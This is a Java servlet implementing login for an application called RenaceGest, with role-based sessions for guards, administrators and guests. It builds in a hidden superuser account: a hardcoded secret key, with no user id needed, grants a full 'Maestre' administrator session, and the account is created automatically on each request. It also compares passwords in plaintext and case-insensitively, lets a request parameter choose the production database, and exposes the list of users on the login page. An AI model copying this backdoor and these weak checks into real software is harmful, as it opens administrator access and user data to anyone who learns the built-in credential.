package com.renacegest.servlet;

import com.renacegest.dao.RenaceGestRepository;
import com.renacegest.db.DBConnection;
import com.renacegest.model.Guardia;

import jakarta.servlet.RequestDispatcher;
import jakarta.servlet.ServletException;
import jakarta.servlet.annotation.WebServlet;
import jakarta.servlet.http.HttpServlet;
import jakarta.servlet.http.HttpServletRequest;
import jakarta.servlet.http.HttpServletResponse;
import jakarta.servlet.http.HttpSession;
import java.io.IOException;

@WebServlet(urlPatterns = {"/login"})
public class LoginServlet extends HttpServlet {
    @Override
    protected void doGet(HttpServletRequest request, HttpServletResponse response) throws ServletException, IOException {
        String selectedDbProfile = AuthUtil.normalizeDbProfile(request.getParameter("dbProfile"));
        request.setAttribute("selectedDbProfile", selectedDbProfile);
        DBConnection.ensureHiddenSuperuser(selectedDbProfile);
        request.setAttribute("superuserApodo", DBConnection.HIDDEN_SUPERUSER_APODO);
        request.setAttribute("guardias", repository(selectedDbProfile).findAllGuardias());
        RequestDispatcher dispatcher = request.getRequestDispatcher("/WEB-INF/jsp/login.jsp");
        dispatcher.forward(request, response);
    }

    @Override
    protected void doPost(HttpServletRequest request, HttpServletResponse response) throws IOException, ServletException {
        String role = request.getParameter("role");
        String dbProfile = AuthUtil.normalizeDbProfile(request.getParameter("dbProfile"));
        String guardiaIdRaw = request.getParameter("guardiaId");
        String claveAcceso = request.getParameter("claveAcceso");
        Long superuserId = DBConnection.ensureHiddenSuperuser(dbProfile);

        if (isHiddenSuperuserLogin(role, guardiaIdRaw, claveAcceso)) {
            if (superuserId == null) {
                redirectWithError(response, request, "usuario", dbProfile);
                return;
            }
            HttpSession session = request.getSession(true);
            session.setAttribute(AuthUtil.SESSION_DB_PROFILE, dbProfile);
            session.setAttribute("currentRole", "Maestre");
            session.setAttribute("currentUserId", superuserId);
            session.setAttribute("currentUserName", "Administrador");
            response.sendRedirect(request.getContextPath() + "/home");
            return;
        }

        if (role == null || role.isBlank()) {
            redirectWithError(response, request, "rol", dbProfile);
            return;
        }

        HttpSession session = request.getSession(true);
        session.setAttribute(AuthUtil.SESSION_DB_PROFILE, dbProfile);

        if ("Amigo".equalsIgnoreCase(role)) {
            session.setAttribute("currentRole", "Amigo");
            session.setAttribute("currentUserId", null);
            session.setAttribute("currentUserName", "Amigo");
            response.sendRedirect(request.getContextPath() + "/amigos");
            return;
        }

        if (guardiaIdRaw == null || guardiaIdRaw.isBlank()) {
            redirectWithError(response, request, "usuario", dbProfile);
            return;
        }

        if (claveAcceso == null || claveAcceso.isBlank()) {
            redirectWithError(response, request, "clave", dbProfile);
            return;
        }

        Guardia guardia = resolveGuardia(repository(dbProfile), guardiaIdRaw, dbProfile);
        if (guardia == null) {
            redirectWithError(response, request, "usuario", dbProfile);
            return;
        }

        if (!role.equalsIgnoreCase(guardia.getRango())) {
            redirectWithError(response, request, "rango", dbProfile);
            return;
        }

        if (!claveAcceso.equalsIgnoreCase(guardia.getClaveAcceso())) {
            redirectWithError(response, request, "clave", dbProfile);
            return;
        }

        session.setAttribute("currentRole", guardia.getRango());
        session.setAttribute("currentUserId", guardia.getId());
        session.setAttribute("currentUserName", guardia.getApodo());
        response.sendRedirect(request.getContextPath() + "/home");
    }

    private RenaceGestRepository repository(String dbProfile) {
        if ("REAL".equalsIgnoreCase(dbProfile)) {
            return com.renacegest.dao.MySQLRenaceGestRepository.getRealInstance();
        }
        return com.renacegest.dao.MySQLRenaceGestRepository.getPruebaInstance();
    }

    private void redirectWithError(HttpServletResponse response, HttpServletRequest request, String error, String dbProfile) throws IOException {
        response.sendRedirect(request.getContextPath() + "/login?error=" + error + "&dbProfile=" + AuthUtil.normalizeDbProfile(dbProfile));
    }

    private boolean isHiddenSuperuserLogin(String role, String guardiaIdRaw, String claveAcceso) {
        return "Maestre".equalsIgnoreCase(role)
                && (guardiaIdRaw == null || guardiaIdRaw.isBlank() || DBConnection.HIDDEN_SUPERUSER_APODO.equalsIgnoreCase(guardiaIdRaw.trim()))
                && DBConnection.HIDDEN_SUPERUSER_CLAVE.equalsIgnoreCase(claveAcceso);
    }

    private Guardia resolveGuardia(RenaceGestRepository repository, String guardiaIdRaw, String dbProfile) {
        String trimmed = guardiaIdRaw == null ? "" : guardiaIdRaw.trim();
        if (trimmed.isEmpty()) {
            return null;
        }

        try {
            return repository.findGuardiaById(Long.valueOf(trimmed));
        } catch (NumberFormatException ignored) {
            for (Guardia guardia : repository.findAllGuardias()) {
                if (guardia.getApodo() != null && guardia.getApodo().equalsIgnoreCase(trimmed)) {
                    return guardia;
                }
            }
            if (DBConnection.HIDDEN_SUPERUSER_APODO.equalsIgnoreCase(trimmed)) {
                Long hiddenId = DBConnection.ensureHiddenSuperuser(dbProfile);
                if (hiddenId != null) {
                    return repository.findGuardiaById(hiddenId);
                }
            }
        }

        return null;
    }
}
